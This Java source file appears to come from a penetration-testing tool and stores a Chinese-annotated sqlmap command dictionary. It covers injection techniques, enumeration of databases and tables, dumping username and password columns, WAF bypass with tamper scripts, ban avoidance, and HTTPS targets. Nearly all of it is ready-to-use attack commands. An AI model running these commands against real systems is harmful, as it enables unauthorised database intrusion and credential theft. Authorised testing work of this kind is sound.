package com.xzhscan.dictionary;

import java.util.List;
import java.util.Map;
import java.util.LinkedHashMap;
import java.util.stream.Collectors;

/**
 * sqlmap 命令速查字典（Dictionary 页签 · sqlmap命令子页）。
 *
 * 按注入类型给命令模板：什么场景用什么 technique 与参数；https 专项单独成组。
 * 命令均为可直接改写目标后使用的完整形态。
 */
public final class SqlmapCmdDict {

    private SqlmapCmdDict() {
    }

    private static final Map<String, List<DictEntry>> BY_SCENE = build();

    public static List<DictEntry> all() {
        return BY_SCENE.values().stream().flatMap(List::stream).collect(Collectors.toList());
    }

    public static List<String> categories() {
        return List.copyOf(BY_SCENE.keySet());
    }

    public static List<DictEntry> byCategory(String scene) {
        List<DictEntry> list = BY_SCENE.get(scene);
        return list == null ? List.of() : List.copyOf(list);
    }

    private static Map<String, List<DictEntry>> build() {
        Map<String, List<DictEntry>> m = new LinkedHashMap<>();

        // ---------- 目标与请求形态 ----------
        m.put("目标与请求形态", List.of(
                new DictEntry("目标与请求形态", "GET 参数（最快上手）",
                        "sqlmap -u \"http://target.com/page.php?id=1\" --batch",
                        "--batch 全默认应答；探测等级默认 1/1"),
                new DictEntry("目标与请求形态", "POST 表单",
                        "sqlmap -u \"http://target.com/login\" --data=\"username=admin&password=1\" --batch",
                        "--data 里的参数全部参与检测"),
                new DictEntry("目标与请求形态", "JSON 请求体",
                        "sqlmap -u \"http://target.com/api/user\" --data='{\"id\":1}' "
                                + "-H \"Content-Type: application/json\" --batch",
                        "sqlmap ≥1.4 自动识别 JSON；数字不加引号走 NUMBER 变异"),
                new DictEntry("目标与请求形态", "Burp 请求文件（推荐，最稳）",
                        "sqlmap -r request.txt --batch\n"
                                + "# request.txt：Burp 右键 Copy to file / 抓包原文",
                        "头部/cookie/编码原样复用；-p id 指定参数"),
                new DictEntry("目标与请求形态", "指定注入参数（跳过无效探测）",
                        "sqlmap -r request.txt -p id --batch\n"
                                + "# 或 URL 标记：sqlmap -u \"http://t.com/page.php?id=1*\"",
                        "* 标记强测该点；-p 支持逗号多参数"),
                new DictEntry("目标与请求形态", "Cookie/头注入点",
                        "sqlmap -r request.txt --cookie=\"PHPSESSID=abc\" -H \"X-Forwarded-For: 127.0.0.1*\" --batch\n"
                                + "# 头值尾加 * 即标记注入点",
                        "Cookie 注入 --level ≥2 才测，头注入 --level ≥3"),
                new DictEntry("目标与请求形态", "代理到 Burp 联动看流量",
                        "sqlmap -r request.txt --proxy=\"http://127.0.0.1:8080\" --batch",
                        "Burp 8080 监听；--proxy-cred 认证代理")));

        // ---------- 按注入类型（technique） ----------
        m.put("按注入类型", List.of(
                new DictEntry("按注入类型", "布尔盲注",
                        "sqlmap -r request.txt --technique=B --batch -v 3",
                        "B=Boolean；-v 3 显示注入 payload 便于人工核对差分"),
                new DictEntry("按注入类型", "时间盲注",
                        "sqlmap -r request.txt --technique=T --time-sec=5 --batch",
                        "--time-sec 控制延时秒数；网络抖动大可调 8-10"),
                new DictEntry("按注入类型", "报错注入",
                        "sqlmap -r request.txt --technique=E --batch",
                        "E=Error；extractvalue/CONVERT 系自动出数"),
                new DictEntry("按注入类型", "UNION 注入",
                        "sqlmap -r request.txt --technique=U --union-cols=10 --batch",
                        "自动 1-10 列；--union-cols=1-20 扩范围；--union-char=x"),
                new DictEntry("按注入类型", "堆叠查询",
                        "sqlmap -r request.txt --technique=S --batch",
                        "S=Stacked；仅 MSSQL/PG/MySQL(默认关) 等支持多语句"),
                new DictEntry("按注入类型", "组合全跑（默认）",
                        "sqlmap -r request.txt --technique=BEUST --batch",
                        "默认即 BEUST 全试；指定 ET 等缩范围提速"),
                new DictEntry("按注入类型", "常见中间件/语言参数",
                        "sqlmap -r request.txt --random-agent --threads=4 --batch",
                        "--random-agent 换 UA 过基础封禁；--threads ≤4 温和")));

        // ---------- 出库名标准链路 ----------
        m.put("出库名标准链路", List.of(
                new DictEntry("出库名标准链路", "① 确认注入并看当前库",
                        "sqlmap -r request.txt --batch --current-db",
                        "确认注入点后先 --current-db，等价 SELECT DATABASE()/DB_NAME()"),
                new DictEntry("出库名标准链路", "② 枚举全部库",
                        "sqlmap -r request.txt --batch --dbs",
                        "information_schema.schemata / master..sysdatabases / pg_database"),
                new DictEntry("出库名标准链路", "③ 指定库出表",
                        "sqlmap -r request.txt --batch -D target_db --tables",
                        "-D 接 ② 的库名"),
                new DictEntry("出库名标准链路", "④ 指定表出列",
                        "sqlmap -r request.txt --batch -D target_db -T users --columns",
                        "-T 逗号多表"),
                new DictEntry("出库名标准链路", "⑤ dump 数据",
                        "sqlmap -r request.txt --batch -D target_db -T users -C username,password --dump",
                        "--start=0 --count=10 限量；--dump-all 全库（慎用）"),
                new DictEntry("出库名标准链路", "一步到位（已知结构）",
                        "sqlmap -r request.txt --batch --current-db --dbs -D target_db --tables",
                        "长任务建议 --output-dir 存盘；--flush-session 重扫")));

        // ---------- 鉴权与会话 ----------
        m.put("鉴权与会话", List.of(
                new DictEntry("鉴权与会话", "Cookie 会话",
                        "sqlmap -r request.txt --cookie=\"PHPSESSID=abc; token=xyz\" --batch",
                        "已登录态必带；-r 方式请求文件里已有则不用重复"),
                new DictEntry("鉴权与会话", "跟随/丢弃 Set-Cookie",
                        "sqlmap -r request.txt --cookie=\"a=b\" --drop-set-cookie --batch",
                        "默认跟随；--drop-set-cookie 防会话漂移"),
                new DictEntry("鉴权与会话", "HTTP Basic/Digest",
                        "sqlmap -r request.txt --auth-type=Basic --auth-cred=\"user:pass\" --batch",
                        "NTLM 同形：--auth-type=NTLM"),
                new DictEntry("鉴权与会话", "跳过启发式降噪",
                        "sqlmap -r request.txt --skip-heuristics --batch\n"
                                + "# 减请求量：--skip=\"referer,user-agent\" 跳过指定参数",
                        "与 XzhScan 差分页人工核对互补")));

        // ---------- WAF 绕过与加固 ----------
        m.put("WAF 绕过与加固", List.of(
                new DictEntry("WAF 绕过与加固", "tamper 脚本",
                        "sqlmap -r request.txt --tamper=space2comment --batch\n"
                                + "# 常用：space2comment / between / randomcase / charencode",
                        "可叠多个逗号分隔；按 WAF 指纹选"),
                new DictEntry("WAF 绕过与加固", "探测强度档位",
                        "sqlmap -r request.txt --level=3 --risk=2 --batch",
                        "level 1-5（3 测 Cookie/头），risk 1-3（2 含 OR 注入，3 慎用 UPDATE 味）"),
                new DictEntry("WAF 绕过与加固", "限速防封",
                        "sqlmap -r request.txt --delay=1 --time-sec=10 --threads=1 --batch",
                        "对源站温和；配合 --random-agent"),
                new DictEntry("WAF 绕过与加固", "自签/异常证书容忍",
                        "sqlmap -r request.txt --force-ssl --ignore-401 --batch",
                        "https 自签名场景配合 --force-ssl（见 https 专项）")));

        // ---------- https 专项 ----------
        m.put("https 专项", List.of(
                new DictEntry("https 专项", "标准 https 目标",
                        "sqlmap -u \"https://target.com/page.php?id=1\" --batch",
                        "URL 写 https 即自动 TLS；无需额外参数"),
                new DictEntry("https 专项", "http→https 跳转环境强制 TLS",
                        "sqlmap -u \"http://target.com/page.php?id=1\" --force-ssl --batch",
                        "--force-ssl 把所有请求强制走 443/TLS，重定向环境必加"),
                new DictEntry("https 专项", "自签名证书（内网/靶场常见）",
                        "sqlmap -r request.txt --force-ssl --batch\n"
                                + "# 仍报 SSL 错误时：--proxy=\"http://127.0.0.1:8080\" 让 Burp 终结 TLS 再转发",
                        "sqlmap 无 --insecure 开关；自签报错走 Burp 二层代理最稳"),
                new DictEntry("https 专项", "https + 鉴权 + JSON 全家桶",
                        "sqlmap -u \"https://target.com/api/user\" --data='{\"id\":1}' "
                                + "-H \"Content-Type: application/json\" "
                                + "-H \"Cookie: session=abc\" --force-ssl --batch --current-db",
                        "一条出库名最小完整命令"),
                new DictEntry("https 专项", "客户端证书（双向 TLS）",
                        "sqlmap -r request.txt --cert=/path/client.pem --key=/path/client.key --batch",
                        "mTLS 内网系统用；PEM 格式")));

        return m;
    }
}
